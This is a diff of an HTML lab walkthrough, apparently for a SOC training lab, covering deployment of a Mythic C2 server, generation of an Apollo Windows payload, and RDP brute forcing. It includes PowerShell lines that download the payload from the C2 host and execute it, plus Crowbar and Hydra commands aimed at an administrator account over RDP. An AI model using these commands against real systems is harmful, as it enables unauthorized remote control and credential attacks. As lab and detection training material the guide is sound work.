@@ -1,156 +1,171 @@
-<h2>💻 Demo: Deploying Mythic Server</h2>
-<ul>
-  <li>Deploy a new server using Vultr (Ubuntu OS, 4GB RAM, Toronto region).</li>
-  <li>Download and install Kali Linux locally (VMware image recommended).</li>
-  <li>SSH into the Mythic server:</li>
-</ul>
-<pre><code>ssh root@&lt;server-ip&gt;
-</code></pre>
+<h1>Mythic C2 Deployment with Payload and Brute Force Testing</h1>
 
-<h2>⚙️ Setting Up Mythic</h2>
+<nav>
+  <h3>📚 Table of Contents</h3>
+  <ul>
+    <li><a href="#demo">Deploy Mythic Server</a></li>
+    <li><a href="#setup">Install and Configure Mythic</a></li>
+    <li><a href="#secure">Secure the Server (Firewall)</a></li>
+    <li><a href="#access">Access Mythic Web GUI</a></li>
+    <li><a href="#post-setup">Post-Setup: Install Apollo & HTTP C2</a></li>
+    <li><a href="#payload">Payload Hosting & Execution</a></li>
+    <li><a href="#brute-force">Crowbar & Hydra for RDP Brute Force</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+
+<h2 id="demo">💻 Deploy Mythic Server</h2>
 <ul>
-  <li>Update and upgrade server packages:</li>
+  <li>Deploy a Vultr instance:
+    <ul>
+      <li>OS: <code>Ubuntu 22.04</code></li>
+      <li>RAM: <code>4GB</code></li>
+      <li>Region: <code>Toronto</code></li>
+    </ul>
+  </li>
+  <li>Download Kali Linux (VMware image)</li>
+  <li>SSH into server:
+    <pre><code>ssh root@&lt;server-ip&gt;</code></pre>
+  </li>
 </ul>
-<pre><code>apt-get update
-apt-get upgrade -y
-</code></pre>
-<ul>
-  <li>Install Docker and Docker Compose from the official repository:</li>
-</ul>
-<pre><code>apt-get remove docker docker-engine docker.io containerd runc -y
+
+<h2 id="setup">⚙️ Install and Configure Mythic</h2>
+<ol>
+  <li>Update system:
+    <pre><code>
 apt-get update
+apt-get upgrade -y
+    </code></pre>
+  </li>
+  <li>Install Docker (clean and reinstall from official repo):
+    <pre><code>
+apt-get remove docker docker-engine docker.io containerd runc -y
 apt-get install ca-certificates curl gnupg lsb-release -y
 mkdir -p /etc/apt/keyrings
 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
-echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list &gt; /dev/null
+echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
 apt-get update
 apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y
-</code></pre>
-<ul>
-  <li>Install Make (confirm if needed):</li>
-</ul>
-<pre><code>apt install make -y
-</code></pre>
-<ul>
-  <li>Clone Mythic repository:</li>
-</ul>
-<pre><code>git clone https://github.com/its-a-feature/Mythic.git
-</code></pre>
-<ul>
-  <li>Navigate to Mythic directory and run install script:</li>
-</ul>
-<pre><code>cd Mythic
+    </code></pre>
+  </li>
+  <li>Install Make:
+    <pre><code>apt install make -y</code></pre>
+  </li>
+  <li>Clone and install Mythic:
+    <pre><code>
+git clone https://github.com/its-a-feature/Mythic.git
+cd Mythic
 ./install_docker_ubuntu.sh
-</code></pre>
-<ul>
-  <li>Start Docker and verify status:</li>
-</ul>
-<pre><code>systemctl restart docker
+    </code></pre>
+  </li>
+  <li>Start Docker:
+    <pre><code>
+systemctl restart docker
 systemctl enable docker
 systemctl status docker
-</code></pre>
-<ul>
-  <li>Start Mythic services:</li>
-</ul>
-<pre><code>make
+    </code></pre>
+  </li>
+  <li>Start Mythic:
+    <pre><code>
+make
 mythic-cli start
-</code></pre>
+    </code></pre>
+  </li>
+</ol>
 
-<h2>🔒 Securing Mythic Server</h2>
+<h2 id="secure">🔒 Secure the Server (Firewall)</h2>
 <ul>
-  <li>Configure Vultr firewall:</li>
-  <li>Allow TCP ports 1-65535 for your IP and for your Kali and Windows Server IPs.</li>
-  <li>Assign the firewall to the Mythic server instance.</li>
+  <li>Create a Vultr firewall group</li>
+  <li>Allow TCP ports <code>1–65535</code> for:
+    <ul>
+      <li>Your IP</li>
+      <li>Kali Linux IP</li>
+      <li>Windows Server IP</li>
+    </ul>
+  </li>
+  <li>Assign firewall to the Mythic server</li>
 </ul>
 
-<h2>🌐 Accessing Mythic Web GUI</h2>
+<h2 id="access">🌐 Access Mythic Web GUI</h2>
 <ul>
-  <li>Access Mythic at:</li>
-</ul>
-<pre><code>https://&lt;server-ip&gt;:7443
-</code></pre>
-<ul>
-  <li>If HTTPS warning appears, manually prepend <code>https://</code> in URL.</li>
-  <li>Find login credentials from <code>.env</code> file:</li>
-</ul>
-<pre><code>ls -la
+  <li>Open:
+    <pre><code>https://&lt;server-ip&gt;:7443</code></pre>
+  </li>
+  <li>If HTTPS warning, manually prepend <code>https://</code></li>
+  <li>Get credentials:
+    <pre><code>
+ls -la
 cat .env
-</code></pre>
-<ul>
-  <li>Login with <code>mythic_admin</code> and password from <code>.env</code>.</li>
-  <li>Switch UI to dark mode by clicking the sun/moon icon.</li>
+    </code></pre>
+  </li>
+  <li>Login with <code>mythic_admin</code> and password from `.env`</li>
+  <li>🌓 Toggle dark mode using the sun/moon icon</li>
 </ul>
 
-<h2>🛠 Full Post-Setup Mythic Walkthrough</h2>
+<h2 id="post-setup">🛠 Post-Setup: Install Apollo & HTTP C2</h2>
 <ul>
-  <li><strong>Install Agent (Apollo):</strong></li>
-</ul>
-<pre><code>cd ~/Mythic
+  <li>Install Apollo Agent:
+    <pre><code>
+cd ~/Mythic
 mythic-cli install github https://github.com/MythicAgents/apollo
-</code></pre>
-<ul>
-  <li><strong>Install C2 Profile (HTTP):</strong></li>
-</ul>
-<pre><code>mythic-cli install github https://github.com/MythicC2Profiles/http
-</code></pre>
-<ul>
-  <li><strong>Restart Mythic Services:</strong></li>
-</ul>
-<pre><code>mythic-cli stop
+    </code></pre>
+  </li>
+  <li>Install HTTP C2 profile:
+    <pre><code>
+mythic-cli install github https://github.com/MythicC2Profiles/http
+    </code></pre>
+  </li>
+  <li>Restart Mythic:
+    <pre><code>
+mythic-cli stop
 mythic-cli start
-</code></pre>
-<ul>
-  <li><strong>Generate a Payload via Web GUI:</strong></li>
-  <li>Payloads &gt; Actions &gt; Generate New Payload</li>
-  <li>Choose: Windows, Apollo Agent, HTTP C2 Profile, Output EXE, Fill in Callback Host/Public IP, Port 80.</li>
-</ul>
-<ul>
-  <li><strong>Host the Payload via HTTP Server:</strong></li>
-</ul>
-<pre><code>python3 -m http.server 9999
-</code></pre>
-<ul>
-  <li><strong>On Windows:</strong> Download the payload</li>
-</ul>
-<pre><code>Invoke-WebRequest -Uri http://&lt;mythic-ip&gt;:9999/&lt;payload.exe&gt; -OutFile C:\Users\Public\Downloads\payload.exe
-</code></pre>
-<ul>
-  <li><strong>Execute the Payload:</strong></li>
-</ul>
-<pre><code>Start-Process "C:\Users\Public\Downloads\payload.exe"
-</code></pre>
-<ul>
-  <li><strong>Monitor Callbacks in Mythic GUI:</strong></li>
-</ul>
-<p>See new callback session &gt; Interact &gt; Run Commands.</p>
-
-<h2>🔨 Brute Force Using Crowbar (or Hydra as Backup)</h2>
-<ul>
-  <li><strong>Option 1: Crowbar Installation</strong> (preferred if working):</li>
-</ul>
-<pre><code>sudo apt-get install crowbar -y
-</code></pre>
-<ul>
-  <li><strong>Running Crowbar for RDP Brute Force:</strong></li>
-</ul>
-<pre><code>crowbar -b rdp -u administrator -C mydfir-wordlist.txt -s &lt;target-ip&gt;/32
-</code></pre>
-<ul>
-  <li><strong>Option 2: Hydra Installation</strong> (if Crowbar fails):</li>
-</ul>
-<pre><code>sudo apt install hydra -y
-</code></pre>
-<ul>
-  <li><strong>Running Hydra for RDP Brute Force:</strong></li>
-</ul>
-<pre><code>hydra -l administrator -P mydfir-wordlist.txt rdp://&lt;target-ip&gt;
-</code></pre>
-
-<h2>🤔 Conclusion</h2>
-<ul>
-  <li>Mythic C2 offers a powerful web-based platform for red teaming and SOC defense simulations.</li>
-  <li>Crowbar is a lightweight RDP brute force tool; Hydra serves as a reliable fallback.</li>
+    </code></pre>
+  </li>
 </ul>
 
+<h2 id="payload">📦 Payload Hosting & Execution</h2>
+<ol>
+  <li>In Mythic GUI → Payloads → Actions → Generate New Payload</li>
+  <li>Select:
+    <ul>
+      <li>Platform: Windows</li>
+      <li>Agent: Apollo</li>
+      <li>C2: HTTP</li>
+      <li>Output: EXE</li>
+      <li>Callback Host: Public IP</li>
+      <li>Port: 80</li>
+    </ul>
+  </li>
+  <li>Host via Python:
+    <pre><code>python3 -m http.server 9999</code></pre>
+  </li>
+  <li>On Windows (PowerShell):
+    <pre><code>
+Invoke-WebRequest -Uri http://&lt;mythic-ip&gt;:9999/&lt;payload.exe&gt; -OutFile C:\Users\Public\Downloads\payload.exe
+Start-Process "C:\Users\Public\Downloads\payload.exe"
+    </code></pre>
+  </li>
+  <li>Check Mythic for Callback → Interact → Run Commands</li>
+</ol>
 
-<a href="https://github.com/MythicAgents/Apollo"> Mythic Appollo Commands</a>
+<h2 id="brute-force">🔨 Brute Force Testing: Crowbar & Hydra</h2>
+
+<h3>Option 1: Crowbar</h3>
+<pre><code>
+sudo apt-get install crowbar -y
+crowbar -b rdp -u administrator -C mydfir-wordlist.txt -s &lt;target-ip&gt;/32
+</code></pre>
+
+<h3>Option 2: Hydra (if Crowbar fails)</h3>
+<pre><code>
+sudo apt install hydra -y
+hydra -l administrator -P mydfir-wordlist.txt rdp://&lt;target-ip&gt;
+</code></pre>
+
+<h2 id="conclusion">🤔 Conclusion</h2>
+<ul>
+  <li>Successfully deployed and accessed Mythic C2 with Apollo agent and HTTP profile</li>
+  <li>Executed payload, confirmed callbacks, and tested brute-force detection via Crowbar and Hydra</li>
+</ul>
+
+<p>🔗 <a href="https://github.com/MythicAgents/Apollo" target="_blank">Mythic Apollo Commands Reference</a></p>
